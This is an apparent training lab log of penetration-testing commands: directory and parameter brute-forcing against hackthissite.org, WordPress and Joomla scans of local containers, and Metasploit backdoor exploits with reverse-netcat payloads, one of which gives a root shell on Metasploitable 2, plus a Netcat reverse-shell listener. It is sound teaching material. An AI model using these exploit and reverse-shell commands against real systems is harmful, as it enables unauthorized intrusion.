# Commands Used – Vulnerability Assessment, Initial Exploitation & Web Application Penetration Testing

## Overview

This document contains the primary commands executed during Week 03 of the engagement. Each command is accompanied by its purpose and expected outcome to provide context and improve reproducibility.

---

# 1. FFUF

## Purpose

FFUF is a fast web fuzzer used to brute-force hidden directories on the target web application.

### Command

```bash
ffuf -u https://hackthissite.org/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-fc 404 -s
```

### Expected Output

- List of valid directory paths (non-404 responses)
- Status codes and response sizes for each discovered path

### Why It Was Used

FFUF provided fast, low-noise directory discovery by filtering out 404 responses, surfacing only paths worth investigating further.
### Evidence

![FFUF Directory Scan Results](images/ffuf-directory-scan-results.png)
---

# 2. Dirsearch

## Purpose

Dirsearch is an automated directory brute-forcer with extension-aware scanning, used to detect backup files and configuration artifacts.

### Command

```bash
git clone https://github.com/maurosoria/dirsearch.git --depth 1
chmod +x dirsearch-linux-amd64

dirsearch -u https://hackthissite.org \
-w /usr/share/seclists/Discovery/Web-Content/common.txt

dirsearch -u https://hackthissite.org -e php,html,js,zip,txt
```

### Expected Output

- Discovered files with specified extensions (e.g. backup.zip, database.sql, config.php, test.php)
- Output log saved to dirsearch_results.txt

### Why It Was Used

Dirsearch's extension-aware scanning surfaced backup and configuration files that a plain directory list would not reveal.

---

# 3. Gobuster

## Purpose

Gobuster is a directory and DNS brute-forcer, used here to cross-validate results from FFUF and Dirsearch.

### Command

```bash
gobuster dir -u https://hackthissite.org \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-t 50 \
--exclude-length 272
```

### Expected Output

- Confirmed directory paths (e.g. /admin, /uploads, /config, /dev)
- HTTP status codes for each result

### Why It Was Used

Running a second directory brute-forcer with a different engine reduced the risk of missing valid paths due to tool-specific limitations.

---

# 4. Arjun

## Purpose

Arjun discovers hidden HTTP parameters by brute-forcing common parameter names against a target endpoint.

### Command

```bash
git clone https://github.com/s0md3v/Arjun.git
pipx upgrade Arjun

arjun -u https://hackthissite.org/search
```

### Expected Output

Possible parameters detected (e.g. id, page, file, redirect)

### Why It Was Used

Hidden parameters often expose functionality vulnerable to SQL Injection, LFI, Open Redirect, and IDOR that is not visible from the application's UI.

---

# 5. ParamSpider

## Purpose

ParamSpider mines historical parameters from archived URLs, complementing Arjun's active brute-forcing approach.

### Command

```bash
git clone https://github.com/devanshbatham/ParamSpider
cd ParamSpider
pip3 install -r requirements.txt

paramspider -d hackthissite.org > hackthissite.org.txt

cat results/hackthissite.org.txt | sed 's/.*?//' | tr '&' '\n' | cut -d '=' -f1 | sort -u
```

### Expected Output

Unique parameter names extracted from archived URLs (e.g. id, page, file, search, user, category, redirect, lang)

### Why It Was Used

Archive-based parameter mining surfaces parameters that were used historically and may still be processed by the application, even if no longer linked.

---

# 6. Searchsploit

## Purpose

Searchsploit queries a local, offline copy of Exploit-DB to check for publicly known exploits matching a service and version.

### Command

```bash
searchsploit vsftpd 2.3.4
searchsploit samba 3.0.20
searchsploit apache 2.4.49
```

### Expected Output

List of matching exploit titles and their local Exploit-DB paths.

### Why It Was Used

Searchsploit provided a fast, offline first check on exploit availability before cross-referencing NVD and Exploit-DB online.

---

# 7. Docker

## Purpose

Docker was used to deploy isolated, disposable WordPress and Joomla environments for CMS security assessment.

### Command

```bash
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker
docker --version
docker ps

git clone https://github.com/wpscanteam/VulnerableWordPress.git
cd VulnerableWordPress
sudo docker build -t vulnerablewordpress .
sudo docker run -d -p 8080:80 -p 3306:3306 --name vulnerablewordpress vulnerablewordpress

docker-compose up -d
```

### Expected Output

- Confirmed running containers via `docker ps`
- Apache accessible on port 8080 (WordPress) and port 8081 (Joomla)
- MySQL/MariaDB backend accessible on the configured port

### Why It Was Used

Docker allowed both vulnerable CMS platforms to be deployed and torn down without affecting the host system or other lab components.

---

# 8. WPScan

## Purpose

WPScan is a WordPress-specific security scanner used to identify version, exposed files, usernames, and vulnerable plugins.

### Command

```bash
wpscan --version
wpscan --url http://127.0.0.1:8080
wpscan --url http://127.0.0.1:8080 --enumerate u
wpscan --url http://127.0.0.1:8080 --enumerate vp
```

### Expected Output

- WordPress version and server technology
- Exposed files (robots.txt, readme.html, debug.log, configuration backups)
- Enumerated usernames (e.g. admineman)
- Vulnerable plugin results (none detected in this engagement)

### Why It Was Used

WPScan is purpose-built for WordPress and surfaces CMS-specific misconfigurations that generic scanners would miss.

---

# 9. JoomScan

## Purpose

JoomScan is a Joomla-specific security scanner used to identify version, components, plugins, and configuration issues.

### Command

```bash
sudo apt install joomscan

joomscan -u http://localhost:8081
joomscan -u http://localhost:8081 --ec
joomscan -u http://localhost:8081 --enumerate-components

gobuster dir -u http://localhost:8081/components/ -w /usr/share/wordlists/dirb/common.txt
```

### Expected Output

- Joomla version and detected components
- Enumerated plugins
- Directory listing results for the components path

### Why It Was Used

JoomScan is purpose-built for Joomla and identifies component/plugin-level weaknesses not covered by generic web scanners.

---

# 10. Metasploit Framework

## Purpose

Metasploit was used to select, configure, and execute exploit modules against Metasploitable 2, and to verify their outcome.

### Command

```bash
msfconsole

# vsftpd attempt
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set payload cmd/unix/reverse_netcat
run
check
info
nmap -p 6200 192.168.56.101

# UnrealIRCd attempt
search unrealircd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set payload cmd/unix/reverse_netcat
run

# Samba usermap_script attempt (successful)
search usermap_script
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
run

# Post-exploitation verification
whoami
id
uname -a
```

### Expected Output

- vsftpd: exploit executed, no session created (backdoor port inactive)
- UnrealIRCd: exploit executed, target reported not vulnerable, no session created
- Samba usermap_script: `Command shell session 1 opened`, followed by `whoami` returning `root`

### Why It Was Used

Metasploit provided a controlled, repeatable way to test version-matched exploits and confirm actual exploitability rather than assuming it from version numbers alone.

---

# 11. Netcat

## Purpose

Netcat was used as a manual listener to demonstrate catching a reverse shell outside of Metasploit's handler.

### Command

```bash
nc -lvnp 4444
```

### Expected Output

An interactive shell connection from a triggered payload.

### Why It Was Used

Manually operating a listener reinforces understanding of how reverse shells connect back to an attacker-controlled port, independent of Metasploit's automated handler.

---

# Command Summary

| Tool | Purpose |
|------|---------|
| FFUF | Fast directory fuzzing |
| Dirsearch | Extension-aware directory brute-forcing |
| Gobuster | Directory brute-forcing cross-validation |
| Arjun | Hidden parameter discovery |
| ParamSpider | Parameter mining from archived URLs |
| Searchsploit | Offline exploit database search |
| Docker | Isolated CMS environment deployment |
| WPScan | WordPress security assessment |
| JoomScan | Joomla security assessment |
| Metasploit Framework | Exploit selection, execution, and verification |
| Netcat | Manual reverse shell handling |

---

# Key Takeaway

Using multiple discovery and verification tools at each stage — directory discovery, parameter enumeration, and exploit validation — provided broader coverage and reduced the risk of drawing conclusions from a single tool's output. Confirming service versions and matching exploits is only useful when followed by independent verification of the actual result.
